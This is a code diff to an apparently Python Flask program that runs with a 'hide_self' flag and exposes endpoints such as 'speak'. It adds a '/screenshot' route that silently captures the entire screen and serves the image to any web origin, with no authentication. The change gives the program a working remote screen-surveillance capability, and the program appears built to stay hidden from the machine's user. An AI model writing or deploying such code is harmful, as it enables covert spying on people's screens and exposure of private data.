@@ -9,6 +9,8 @@ import tempfile
 #logging.getLogger("Flask").setLevel(logging.WARNING)
 from playsound import playsound
 import socket
+import numpy as np 
+import cv2 
 
 #config
 hide_self = True
@@ -175,6 +177,18 @@ def speak():
 	response = jsonify({'text': 'typed'})
 	response.headers.add('Access-Control-Allow-Origin', '*')
 	return response	
+
+@app.route('/screenshot', methods=['GET'])
+def screenshot():
+	image = pyautogui.screenshot() 
+	image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR) 
+	cv2.imwrite(tempfile.gettempdir()+"\\screenshot.png", image)
+	img = open(tempfile.gettempdir()+"\\screenshot.png", 'rb').read()
+	response = jsonify()
+	response.mimetype='image/png'
+	response.data = img
+	response.headers.add('Access-Control-Allow-Origin', '*')
+	return response		
 
 def main():
 	t = threading.Thread(target=clear_screen,args=())
